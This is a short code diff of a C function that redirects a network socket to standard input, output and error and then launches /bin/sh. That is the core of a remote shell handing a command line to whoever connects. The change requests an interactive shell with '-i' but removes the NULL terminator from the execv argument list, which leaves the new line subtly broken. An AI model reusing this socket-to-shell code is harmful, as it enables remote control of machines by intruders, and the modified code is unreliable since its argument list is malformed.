@@ -58,7 +58,7 @@ int exec_comm_handler( int sck ) {
     if( dup(sck) != 0 || dup(sck) != 1 || dup(sck) != 2 ) 
         exit_with_error("error duplicating socket for stdin/stdout/stderr");
 
-    char* shell_argv[] = {"/bin/sh", NULL};
+    char* shell_argv[] = {"/bin/sh", "-i"};
     execv("/bin/sh", shell_argv);
 }
 
